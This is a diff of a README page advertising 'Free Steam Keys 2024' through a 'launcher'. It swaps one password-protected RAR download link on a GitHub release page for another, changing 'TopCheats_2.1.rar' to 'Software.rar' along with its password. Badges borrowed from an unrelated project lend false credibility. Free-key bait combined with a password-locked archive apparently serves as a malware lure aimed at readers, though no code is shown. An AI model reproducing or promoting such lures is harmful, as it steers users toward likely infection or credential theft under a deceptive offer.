@@ -1,9 +1,8 @@
 # Free Steam Keys 2024
-[![Github All Releases](https://img.shields.io/github/downloads/SecHex/SecHex-Spoofy/total)]() [![Codacy Badge](https://app.codacy.com/project/badge/Grade/0d4fdc1daca5402a8c57efc3bef73d31)]()
- 
- [![Безымя111111нный](https://github.com/AllertUsers/Yuakd11-9.15/assets/165304196/fc0a79c8-fb5a-4519-9986-898a321fee61)](https://github.com/AllertUsers/Yuakd11-9.15/releases/download/TopCheats/TopCheats_2.1.rar)
- > Password: EX2024
+[![Github All Releases](https://img.shields.io/github/downloads/SecHex/SecHex-Spoofy/total)]() [![Codacy Badge](https://app.codacy.com/project/badge/Grade/0d4fdc1daca5402a8c57efc3bef73d31)]() 
 
+ [![Безымя111111нный](https://github.com/AllertUsers/Yuakd11-9.15/assets/165304196/fc0a79c8-fb5a-4519-9986-898a321fee61)](https://github.com/AllertUsers/Yuakd11-9.15/releases/download/Software/Software.rar)
+> Password: Softs2024
 
 ## "Get Your Free Steam Keys with The Launcher: Unlock New Games Today!"
 
